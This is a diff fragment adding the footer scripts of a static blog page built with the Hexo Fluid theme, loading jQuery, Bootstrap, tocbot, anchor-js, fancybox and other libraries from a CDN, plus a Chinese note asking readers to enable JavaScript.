+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
